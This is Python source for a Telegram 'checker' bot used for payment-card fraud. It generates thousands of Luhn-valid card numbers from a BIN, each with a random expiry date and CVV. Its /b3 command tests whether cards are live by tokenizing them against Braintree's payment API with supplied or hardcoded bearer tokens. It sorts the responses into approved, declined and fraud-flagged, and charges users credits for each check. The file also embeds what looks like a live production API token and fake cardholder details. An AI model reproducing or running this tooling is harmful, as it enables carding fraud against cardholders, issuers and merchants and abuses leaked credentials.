            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response1 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    response_data = response1.json()

    credit_card_info = response_data.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
    bin_number = credit_card_info.get('bin', 'Unknown')
    brand_code = credit_card_info.get('brandCode', 'Unknown').lower().capitalize()
    bin_data = credit_card_info.get('binData', {})
    card_type = "DEBIT" if bin_data.get('debit', 'NO') == "YES" else "CREDIT"
    issuing_bank = bin_data.get('issuingBank', 'Unknown').title() if bin_data.get('issuingBank') else 'Unknown'
    country_code = bin_data.get('countryOfIssuance', 'Unknown').title() if bin_data.get('countryOfIssuance') else 'Unknown'

    return bin_number, brand_code, card_type, issuing_bank, country_code

COUNTRY_FLAGS = {
    'AFG': '🇦🇫',  # Afghanistan
    'ALB': '🇦🇱',  # Albania
    'DZA': '🇩🇿',  # Algeria
    'AND': '🇦🇩',  # Andorra
    'AGO': '🇦🇴',  # Angola
    'ATG': '🇦🇬',  # Antigua and Barbuda
    'ARG': '🇦🇷',  # Argentina
    'ARM': '🇦🇲',  # Armenia
    'AUS': '🇦🇺',  # Australia
    'AUT': '🇦🇹',  # Austria
    'AZE': '🇦🇿',  # Azerbaijan
    'BHS': '🇧🇸',  # Bahamas
    'BHR': '🇧🇭',  # Bahrain
    'BGD': '🇧🇩',  # Bangladesh
    'BRB': '🇧🇧',  # Barbados
    'BLR': '🇧🇾',  # Belarus
    'BEL': '🇧🇪',  # Belgium
    'BLZ': '🇧🇿',  # Belize
    'BEN': '🇧🇯',  # Benin
    'BTN': '🇧🇹',  # Bhutan
    'BOL': '🇧🇴',  # Bolivia
    'BIH': '🇧🇦',  # Bosnia and Herzegovina
    'BWA': '🇧🇼',  # Botswana
    'BRA': '🇧🇷',  # Brazil
    'BRN': '🇧🇳',  # Brunei
    'BGR': '🇧🇬',  # Bulgaria
    'BFA': '🇧🇫',  # Burkina Faso
    'BDI': '🇧🇮',  # Burundi
    'CPV': '🇨🇻',  # Cape Verde
    'KHM': '🇰🇭',  # Cambodia
    'CMR': '🇨🇲',  # Cameroon
    'CAN': '🇨🇦',  # Canada
    'CAF': '🇨🇫',  # Central African Republic
    'TCD': '🇹🇩',  # Chad
    'CHL': '🇨🇱',  # Chile
    'CHN': '🇨🇳',  # China
    'COL': '🇨🇴',  # Colombia
    'COM': '🇰🇲',  # Comoros
    'COG': '🇨🇬',  # Congo (Brazzaville)
    'COD': '🇨🇩',  # Congo (Kinshasa)
    'CRI': '🇨🇷',  # Costa Rica
    'CIV': '🇨🇮',  # Côte d'Ivoire
    'HRV': '🇭🇷',  # Croatia
    'CUB': '🇨🇺',  # Cuba
    'CYP': '🇨🇾',  # Cyprus
    'CZE': '🇨🇿',  # Czech Republic
    'DNK': '🇩🇰',  # Denmark
    'DJI': '🇩🇯',  # Djibouti
    'DMA': '🇩🇲',  # Dominica
    'DOM': '🇩🇴',  # Dominican Republic
    'ECU': '🇪🇨',  # Ecuador
    'EGY': '🇪🇬',  # Egypt
    'SLV': '🇸🇻',  # El Salvador
    'GNQ': '🇬🇶',  # Equatorial Guinea
    'ERI': '🇪🇷',  # Eritrea
    'EST': '🇪🇪',  # Estonia
    'SWZ': '🇸🇿',  # Eswatini
    'ETH': '🇪🇹',  # Ethiopia
    'FJI': '🇫🇯',  # Fiji
    'FIN': '🇫🇮',  # Finland
    'FRA': '🇫🇷',  # France
    'GAB': '🇬🇦',  # Gabon
    'GMB': '🇬🇲',  # Gambia
    'GEO': '🇬🇪',  # Georgia
    'DEU': '🇩🇪',  # Germany
    'GHA': '🇬🇭',  # Ghana
    'GRC': '🇬🇷',  # Greece
    'GRD': '🇬🇩',  # Grenada
    'GTM': '🇬🇹',  # Guatemala
    'GIN': '🇬🇳',  # Guinea
    'GNB': '🇬🇼',  # Guinea-Bissau
    'GUY': '🇬🇾',  # Guyana
    'HTI': '🇭🇹',  # Haiti
    'HND': '🇭🇳',  # Honduras
    'HKG': '🇭🇰',  # Hong Kong
    'HUN': '🇭🇺',  # Hungary
    'ISL': '🇮🇸',  # Iceland
    'IND': '🇮🇳',  # India
    'IDN': '🇮🇩',  # Indonesia
    'IRN': '🇮🇷',  # Iran
    'IRQ': '🇮🇶',  # Iraq
    'IRL': '🇮🇪',  # Ireland
    'ISR': '🇮🇱',  # Israel
    'ITA': '🇮🇹',  # Italy
    'JAM': '🇯🇲',  # Jamaica
    'JPN': '🇯🇵',  # Japan
    'JOR': '🇯🇴',  # Jordan
    'KAZ': '🇰🇿',  # Kazakhstan
    'KEN': '🇰🇪',  # Kenya
    'KIR': '🇰🇮',  # Kiribati
    'KWT': '🇰🇼',  # Kuwait
    'KGZ': '🇰🇬',  # Kyrgyzstan
    'LAO': '🇱🇦',  # Laos
    'LVA': '🇱🇻',  # Latvia
    'LBN': '🇱🇧',  # Lebanon
    'LSO': '🇱🇸',  # Lesotho
    'LBR': '🇱🇷',  # Liberia
    'LBY': '🇱🇾',  # Libya
    'LIE': '🇱🇮',  # Liechtenstein
    'LTU': '🇱🇹',  # Lithuania
    'LUX': '🇱🇺',  # Luxembourg
    'MAC': '🇲🇴',  # Macao
    'MDG': '🇲🇬',  # Madagascar
    'MWI': '🇲🇼',  # Malawi
    'MYS': '🇲🇾',  # Malaysia
    'MDV': '🇲🇻',  # Maldives
    'MLI': '🇲🇱',  # Mali
    'MLT': '🇲🇹',  # Malta
    'MHL': '🇲🇭',  # Marshall Islands
    'MRT': '🇲🇷',  # Mauritania
    'MUS': '🇲🇺',  # Mauritius
    'MEX': '🇲🇽',  # Mexico
    'FSM': '🇫🇲',  # Micronesia
    'MDA': '🇲🇩',  # Moldova
    'MCO': '🇲🇨',  # Monaco
    'MNG': '🇲🇳',  # Mongolia
    'MNE': '🇲🇪',  # Montenegro
    'MAR': '🇲🇦',  # Morocco
    'MOZ': '🇲🇿',  # Mozambique
    'MMR': '🇲🇲',  # Myanmar
    'NAM': '🇳🇦',  # Namibia
    'NRU': '🇳🇷',  # Nauru
    'NPL': '🇳🇵',  # Nepal
    'NLD': '🇳🇱',  # Netherlands
    'NZL': '🇳🇿',  # New Zealand
    'NIC': '🇳🇮',  # Nicaragua
    'NER': '🇳🇪',  # Niger
    'NGA': '🇳🇬',  # Nigeria
    'MKD': '🇲🇰',  # North Macedonia
    'NOR': '🇳🇴',  # Norway
    'OMN': '🇴🇲',  # Oman
    'PAK': '🇵🇰',  # Pakistan
    'PLW': '🇵🇼',  # Palau
    'PSE': '🇵🇸',  # Palestine
    'PAN': '🇵🇦',  # Panama
    'PNG': '🇵🇬',  # Papua New Guinea
    'PRY': '🇵🇾',  # Paraguay
    'PER': '🇵🇪',  # Peru
    'PHL': '🇵🇭',  # Philippines
    'POL': '🇵🇱',  # Poland
    'PRT': '🇵🇹',  # Portugal
    'QAT': '🇶🇦',  # Qatar
    'ROU': '🇷🇴',  # Romania
    'RUS': '🇷🇺',  # Russia
    'RWA': '🇷🇼',  # Rwanda
    'KNA': '🇰🇳',  # Saint Kitts and Nevis
    'LCA': '🇱🇨',  # Saint Lucia
    'VCT': '🇻🇨',  # Saint Vincent and the Grenadines
    'WSM': '🇼🇸',  # Samoa
    'SMR': '🇸🇲',  # San Marino
    'STP': '🇸🇹',  # São Tomé and Príncipe
    'SAU': '🇸🇦',  # Saudi Arabia
    'SEN': '🇸🇳',  # Senegal
    'SRB': '🇷🇸',  # Serbia
    'SYC': '🇸🇨',  # Seychelles
    'SLE': '🇸🇱',  # Sierra Leone
    'SGP': '🇸🇬',  # Singapore
    'SVK': '🇸🇰',  # Slovakia
    'SVN': '🇸🇮',  # Slovenia
    'SLB': '🇸🇧',  # Solomon Islands
    'SOM': '🇸🇴',  # Somalia
    'ZAF': '🇿🇦',  # South Africa
    'SSD': '🇸🇸',  # South Sudan
    'ESP': '🇪🇸',  # Spain
    'LKA': '🇱🇰',  # Sri Lanka
    'SDN': '🇸🇩',  # Sudan
    'SUR': '🇸🇷',  # Suriname
    'SWE': '🇸🇪',  # Sweden
    'CHE': '🇨🇭',  # Switzerland
    'SYR': '🇸🇾',  # Syria
    'TWN': '🇹🇼',  # Taiwan
    'TJK': '🇹🇯',  # Tajikistan
    'TZA': '🇹🇿',  # Tanzania
    'THA': '🇹🇭',  # Thailand
    'TLS': '🇹🇱',  # Timor-Leste
    'TGO': '🇹🇬',  # Togo
    'TON': '🇹🇴',  # Tonga
    'TTO': '🇹🇹',  # Trinidad and Tobago
    'TUN': '🇹🇳',  # Tunisia
    'TUR': '🇹🇷',  # Turkey
    'TKM': '🇹🇲',  # Turkmenistan
    'TUV': '🇹🇻',  # Tuvalu
    'UGA': '🇺🇬',  # Uganda
    'UKR': '🇺🇦',  # Ukraine
    'ARE': '🇦🇪',  # United Arab Emirates
    'GBR': '🇬🇧',  # United Kingdom
    'USA': '🇺🇸',  # United States
    'URY': '🇺🇾',  # Uruguay
    'UZB': '🇺🇿',  # Uzbekistan
    'VUT': '🇻🇺',  # Vanuatu
    'VEN': '🇻🇪',  # Venezuela
    'VNM': '🇻🇳',  # Vietnam
    'YEM': '🇾🇪',  # Yemen
    'ZMB': '🇿🇲',  # Zambia
    'ZWE': '🇿🇼',  # Zimbabwe
}

# Broadcast command handler
@bot.message_handler(commands=['brodcast'])
def broadcast(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "<b>You don't have permission to use this command. Contact Bot Owner.</b>", parse_mode="HTML")
        return

    original_message = message.reply_to_message
    if not original_message:
        bot.reply_to(message, "<b>Please reply to a message to broadcast.</b>", parse_mode="HTML")
        return

    data = load_data()
    all_users = data["users"]  # List of user IDs

    text = f"""<b>
Broadcast Started ✅
━━━━━━━━━━━━━━
Total Audience: {len(all_users)}
Messages Sent: 0
Failed to Send: 0
Success Ratio: 0%

Status: In Progress...</b>"""
    status_message = bot.reply_to(message, text, parse_mode="HTML")

    sent_brod = 0
    not_sent = 0
    start = time.perf_counter()
    worker_num = 25

    for i in range(0, len(all_users), worker_num):
        batch = all_users[i:i + worker_num]
        for user_id in batch:
            if message_forward_xcc(original_message, user_id):
                sent_brod += 1
            else:
                not_sent += 1
            time.sleep(0.1)

        progress_text = f"""<b>
Broadcast In Progress ⏳
━━━━━━━━━━━━━━
Total Audience: {len(all_users)}
Messages Sent: {sent_brod}
Failed to Send: {not_sent}
Success Ratio: {int(sent_brod * 100 / len(all_users) if all_users else 0)}%

Status: Sending...</b>"""
        try:
            bot.edit_message_text(
                chat_id=status_message.chat.id,
                message_id=status_message.message_id,
                text=progress_text,
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"Failed to update progress message: {e}")

    taken = str(timedelta(seconds=time.perf_counter() - start))
    hours, minutes, seconds = map(float, taken.split(":"))
    hour = int(hours)
    min = int(minutes)

    final_text = f"""<b>
Broadcast Completed Successfully ✅
━━━━━━━━━━━━━━
Total Audience: {len(all_users)}
Messages Sent: {sent_brod}
Failed to Send: {not_sent}
Success Ratio: {int(sent_brod * 100 / len(all_users) if all_users else 0)}%

Time Taken: {hour} Hour(s) {min} Minute(s)
    </b>"""
    try:
        bot.edit_message_text(
            chat_id=status_message.chat.id,
            message_id=status_message.message_id,
            text=final_text,
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Failed to update final message: {e}")
        bot.reply_to(message, final_text, parse_mode="HTML")

#gen & Bin

def get_bin_info_online(fbin):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{fbin}", timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception as e:
        print(f"BIN API error: {e}")
    return None


def luhn_algorithm(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return card_number if checksum % 10 == 0 else None


def generate_valid_card(bin_input):
    card_length = 16
    if bin_input.startswith("34") or bin_input.startswith("37"):
        card_length = 15

    card_number = bin_input + ''.join(str(random.randint(0, 9)) for _ in range(card_length - len(bin_input)))
    valid_card = luhn_algorithm(card_number)

    if valid_card:
        return valid_card
    else:
        return generate_valid_card(bin_input)


@bot.message_handler(func=lambda message: message.text.lower().startswith('/gen') or message.text.lower().startswith('.gen'))
def handle_gen(message):
    gen_input = message.text.split()[1:]

    if not gen_input:
        bot.reply_to(message, "<b>❌ Wrong Format</b>\n\n<b>Usage:</b>\nOnly Bin:\n<code>/gen 447697</code>\n\nWith Expiration:\n<code>/gen 447697|12</code>\n<code>/gen 447697|12|23</code>\n\nWith CVV:\n<code>/gen 447697|12|23|000</code>\n\nWith Custom Amount:\n<code>/gen 447697|12|23|000 100</code>", parse_mode="HTML")
        return

    gen_input = " ".join(gen_input)
    match = re.match(r'^(\d{6,19})(\|\d{2})?(\|\d{2})?(\|\d{3,4})?(?:\s+(\d+))?$', gen_input)

    if not match:
        bot.reply_to(message, "<b>❌ Wrong Format</b>\n\n<b>Usage:</b>\nOnly Bin:\n<code>/gen 447697</code>\n\nWith Expiration:\n<code>/gen 447697|12</code>\n<code>/gen 447697|12|23</code>\n\nWith CVV:\n<code>/gen 447697|12|23|000</code>\n\nWith Custom Amount:\n<code>/gen 447697|12|23|000 100</code>", parse_mode="HTML")
        return

    bin_input, month, year, cvv, amount = match.groups()
    month = month[1:] if month else None
    year = year[1:] if year else None
    cvv = cvv[1:] if cvv else None
    amount = int(amount) if amount else 10

    if amount > 10000:
        bot.reply_to(message, "<b>⚠️ Maximum limit is 10K</b>", parse_mode="HTML")
        return

    bin_info = get_bin_info_online(bin_input[:6])
    if not bin_info:
        bot.reply_to(message, f"❌ Invalid BIN: <code>{bin_input[:6]}</code>\nNo information found.", parse_mode="HTML")
        return

    brand = bin_info.get("brand", "Unknown").upper()
    card_type = bin_info.get("type", "Unknown").upper()
    level = bin_info.get("level", "Unknown").upper()
    country = bin_info.get("country_name", "Unknown").upper()
    country_flag = bin_info.get("country_flag", "🌐")
    bank = bin_info.get("bank", "Unknown").upper()

    processing_msg = bot.reply_to(message, "🔄 Generating Cards...")

    start_time = time.perf_counter()
    cards = []

    for _ in range(amount):
        valid_card = generate_valid_card(bin_input)

        if month and year:
            expiration = f"{month.zfill(2)}|{year.zfill(2)}"
        elif month:
            expiration = f"{month.zfill(2)}|{random.randint(26, 30)}"
        elif year:
            expiration = f"{random.randint(1, 12):02}|{year.zfill(2)}"
        else:
            expiration = f"{random.randint(1, 12):02}|{random.randint(26, 30)}"

        if bin_input.startswith("34") or bin_input.startswith("37"):
            cvv_code = str(random.randint(1000, 9999))
        else:
            cvv_code = cvv.zfill(3) if cvv else f"{random.randint(100, 999)}"

        card = f"{valid_card}|{expiration}|{cvv_code}"
        cards.append(f"<code>{card}</code>")

    elapsed_time = time.perf_counter() - start_time

    bot.delete_message(chat_id=message.chat.id, message_id=processing_msg.message_id)

    if amount <= 10:
        response_msg = (
            f"[✮] 𝐂𝐂 𝐆𝐞𝐧𝐚𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n"
            f"[✮] 𝐁𝐢𝐧 - <code>{bin_input}</code>\n"
            f"[✮] 𝐀𝐦𝐨𝐮𝐧𝐭 - {amount}\n\n"
            f"-------------------------------------\n"
            f"{chr(10).join(cards)}\n\n"
            f"-------------------------------------\n"
            f"[✮] 𝗜𝗻𝗳𝗼 - {brand} - {card_type} - {level}\n"
            f"[✮] 𝐁𝐚𝐧𝐤 - {bank} 🏛\n"
            f"[✮] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {country_flag}\n"
            f"------------- OWNERS --------------\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"       
        )
        bot.reply_to(message, response_msg, parse_mode="HTML")
    else:
        filename = f"{bin_input}_generated_cards.txt"
        with open(filename, "w") as f:
            f.write("\n".join([card.replace("<code>", "").replace("</code>", "") for card in cards]))

        caption = (
            f"[✮] 𝐁𝐢𝐧: <code>{bin_input}</code>\n"
            f"[✮] 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}\n\n"
            f"[✮] 𝗜𝗻𝗳𝗼 - {brand} - {card_type} - {level}\n"
            f"[✮] 𝐁𝐚𝐧𝐤 - {bank} 🏛\n"
            f"[✮] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 - {country} - {country_flag}\n"
            f"------------- OWNERS --------------\n"
            f"[✮] BOT BY --> MR.BOND\n"
            f"[✮] USERNAME --> taisirshaik\n"       
        )

        bot.send_document(message.chat.id, open(filename, 'rb'), caption=caption, parse_mode="HTML")
        os.remove(filename)

# Command to update the Bearer token
@bot.message_handler(func=lambda message: message.text.startswith(('/bear', '.bear')))
def update_bearer_token(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "You are not authorized to update the Bearer token.")
        return

    try:
        command_args = message.text.split(" ", 1)
        if len(command_args) < 2:
            bot.reply_to(message, "Usage: /bear {new_bearer_token}")
            return

        new_bearer_token = command_args[1]
        set_bearer_token(new_bearer_token)
        bot.reply_to(message, "Bearer token updated successfully.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")


# Modify the headers in tokenize_credit_card function to use the token from the database
def tokenize_credit_card(card_number, exp_month, exp_year, cvv):
    bearer_token = get_bearer_token()
    if not bearer_token:
        raise ValueError("Bearer token is not set.")

    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'authorization': f'Bearer {bearer_token}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': 'd762c1de-0028-4141-be63-254500e88d6f',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                    'billingAddress': {
                        'postalCode': '10080',
                    },
                },
                'options': {
                    'validate': True,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
    try:
        response_data = response.json()
        response_text = json.dumps(response_data).lower()
        return response_text  # Return the entire response as a string
    except json.JSONDecodeError:
        return "Error: Failed to parse response"

def determine_status(response_text):

    # Define your keywords
    declined_keywords = [
        "declined", "card issuer declined", "processor declined", "declined - call issuer",
        "pickup card", "call issuer. pick up card.", "fraudulent", "transaction not allowed",
        "cvv verification failed", "credit card number is invalid", "expired card",
        "card number is incorrect", "service not allowed", "transaction blocked",
        "do not honor", "generic decline", "high-risk", "restricted", "stolen card",
        "lost card", "blacklisted", "postal code verification failed", "avs check failed",
        "invalid cvv", "incorrect cvv", "incorrect cvc", "invalid cvc", 
        "security code is invalid", "security code is incorrect", "zip code is incorrect",
        "zip code is invalid", "cardholder name missing", "billing address invalid",
        "invalid expiration date", "card type not accepted", "unsupported currency",
        "amount must be greater than zero", "transaction declined", "issuer unavailable",
        "no sufficient funds", "transaction limit exceeded", "do not honor by issuer",
        "restricted card", "card not allowed", "insufficient funds"
    ]

    fraud_keywords = [
        "gateway rejected: fraud", "fraudulent", "high-risk transaction", "transaction flagged",
        "suspected fraud", "blacklisted card", "transaction declined due to risk",
        "card not supported", "velocity limit exceeded", "fraud rules triggered"
    ]

    api_issue_keywords = [
        "invalid api keys", "authentication failed", "authorization required", "authentication credentials are invalid", 
        "invalid credentials", "access denied", "merchant account not found",
        "unauthorized request", "invalid token", "permission denied", 
        "user authentication failed", "invalid username or password", 
        "authentication required for transaction", "authorization error",
        "merchant not authorized", "invalid session", "gateway timeout",
        "processing error", "service unavailable", "request timeout",
        "internal server error", "retry later", "gateway unavailable",
        "network connection lost", "payment gateway error", "service disruption",
        "api key expired", "api limit exceeded"
    ]

    approved_keywords = [
        "1000: approved", "transaction successful", "payment processed", "payment approved",
        "authentication required", "gateway rejected: avs", "3d secure passed",
        "aws billing successful", "cardholder authentication passed",
        "thank you for your support", "subscription started", "purchase successful",
        "your order has been received", "transaction completed", "membership confirmation",
        "payment received", "transaction could not be processed", "success", "bin"
    ]

    # Check for keywords in the entire response text
    for kw in approved_keywords:
        if kw in response_text:
            return "APPROVED ✅"

    for kw in declined_keywords:
        if kw in response_text:
            return "DECLINED ❌"

    for kw in fraud_keywords:
        if kw in response_text:
            return "FRAUD/RISK REJECTED 🚨"

    for kw in api_issue_keywords:
        if kw in response_text:
            return "API ISSUE ☠️"

    return "UNKNOWN STATUS 👾"

def extract_bin_details(card_number, exp_month, exp_year, cvv):
    headers = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer production_w3jmfs6q_779b9vbjhk2bffsj',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    json_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'c08117f3-1760-4cb2-ae53-5671a874f3ca',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': card_number,
                    'expirationMonth': exp_month,
                    'expirationYear': exp_year,
                    'cvv': cvv,
                    'cardholderName': 'AntifiedNull Prateek',
                    'billingAddress': {
                        'countryCodeAlpha2': 'IN',
                        'locality': 'Noida',
                        'region': 'UP',
                        'firstName': 'AntifiedNull',
                        'lastName': 'Prateek',
                        'postalCode': '201309',
                        'streetAddress': 'AntifiedNull',
                    },
                },
                'options': {
                    'validate': False,
                },
            },
        },
        'operationName': 'TokenizeCreditCard',
    }

    try:
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        response.raise_for_status()
        bin_info = response.json()

        # Extract BIN-related details from the response
        bin_details = bin_info.get('data', {}).get('tokenizeCreditCard', {}).get('creditCard', {})
        bin_number = bin_details.get('bin', 'Unknown')
        brand_code = bin_details.get('brandCode', 'Unknown').capitalize()
        card_type = "DEBIT" if bin_details.get('binData', {}).get('debit', 'NO') == "YES" else "CREDIT"
        issuing_bank = bin_details.get('binData', {}).get('issuingBank', 'Unknown')

        # Safely convert to title case if issuing_bank is not None
        issuing_bank = issuing_bank.title() if issuing_bank else 'Unknown'

        # Safely convert country_code to uppercase if it is not None
        country_code = bin_details.get('binData', {}).get('countryOfIssuance', 'Unknown')
        country_code = country_code.upper() if country_code else 'Unknown'

        # Get the country flag
        country_flag = country_flags.get(country_code, '')

        return {
            "bin_number": bin_number,
            "brand_code": brand_code,
            "card_type": card_type,
            "issuing_bank": issuing_bank,
            "country_code": country_code,
            "country_flag": country_flag,
        }

    except Exception as e:
        # Return a dictionary with default values and the error message
        return {
            "bin_number": 'Unknown',
            "brand_code": 'Unknown',
            "card_type": 'Unknown',
            "issuing_bank": 'Unknown',
            "country_code": 'Unknown',
            "country_flag": '',
            "error": str(e)
        }

# Example of handling a bot command
@bot.message_handler(func=lambda message: message.text.startswith(('.b3', '/b3')))
def process_command(message):
    try:
        user_id = message.from_user.id

        # Check if the user has enough credits before processing
        cursor = get_cursor()
        cursor.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        user = cursor.fetchone()
        
        if not user or user[0] < 1:
            bot.reply_to(message, "Insufficient credits. Please add more credits to continue.")
            return

        parts = message.text.split(' ', 1)
        if len(parts) < 2 or '|' not in parts[1] or len(parts[1].split('|')) != 4:
            bot.reply_to(message, "Please provide CC in the correct format: cc|mm|yy|cvv")
            return

        card_number, exp_month, exp_year, cvv = parts[1].split('|')
        start_time = time.time()
        response_text = tokenize_credit_card(card_number.strip(), exp_month.strip(), exp_year.strip(), cvv.strip())
        status = determine_status(response_text)
        bin_details = extract_bin_details(card_number.strip(), exp_month.strip(), exp_year.strip(), cvv.strip())
        elapsed_time = time.time() - start_time

        # Deduct 1 credit after processing
        with db_lock:
            cursor.execute("UPDATE users SET credits = credits - 1 WHERE user_id=?", (user_id,))
            conn.commit()

        # Check if there's an error in bin_details
        if 'error' in bin_details:
            response_text = f"Error processing BIN details: {bin_details['error']}"
        else:
            remaining_credits = user[0] - 1
            response_text = f"""
{status}

[↯] 𝗖𝗮𝗿𝗱: {card_number}|{exp_month}|{exp_year}|{cvv}
[↯] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: BRAINTREE AUTH 

[↯] 𝗜𝗻𝗳𝗼: {bin_details['brand_code']}
[↯] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_details['country_code']} {bin_details['country_flag']}
[↯] 𝐓𝐲𝐩𝐞 : {bin_details['card_type']}
[↯] 𝐁𝐢𝐧: {bin_details['bin_number']}
[↯] 𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
[✮] BOT BY --> MR.BOND\n"
[✮] USERNAME --> taisirshaik\n"

"""

        bot.reply_to(message, response_text)

    except Exception as e:
        bot.reply_to(message, f"Error processing the command: {str(e)}")

# Worker thread to process requests
def process_requests():
    while True:
        chat_id, user_prompt = request_queue.get()
        try:
            # Generate image
            image_data = generate_image_from_replicate(user_prompt)
            output_path = f"output_{chat_id}.png"
            with open(output_path, "wb") as f:
                f.write(image_data)
            # Send image
            with open(output_path, "rb") as f:
                bot.send_photo(chat_id, f, caption="Here is your generated image!\nBot By Inferno Checker 「 ∅ 」")
        except Exception as e:
            bot.send_message(chat_id, f"An error occurred: {e}")
        request_queue.task_done()

# Start worker thread
worker_thread = Thread(target=process_requests, daemon=True)
worker_thread.start()

# Cmd /api (admin only)
@bot.message_handler(func=lambda message: message.text.startswith(('/api', '.api')))
def update_api_token(message):
    if not is_admin(message.from_user.id) and message.from_user.id != OWNER_ID:
        bot.reply_to(message, "You are not authorized to update the API key.")
        return

    try:
        command_args = message.text.split(" ", 1)
        if len(command_args) < 2:
            bot.reply_to(message, "Usage: /api {new_api_key}")
            return

        new_api_key = command_args[1]
        set_api_key(new_api_key)
        bot.reply_to(message, "API key updated successfully ✅")
    except Exception as e:
        bot.reply_to(message, f"An error occurred: {e}")

# Start the bot
def start_polling_with_retry():
    while True:
        try:
            print("INFERNO CHECKER BOT IS RUNNING ..... [↯] ")
            bot.polling(none_stop=True, timeout=60)  # Increase timeout to 60 seconds
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying

if __name__ == "__main__":
    start_polling_with_retry()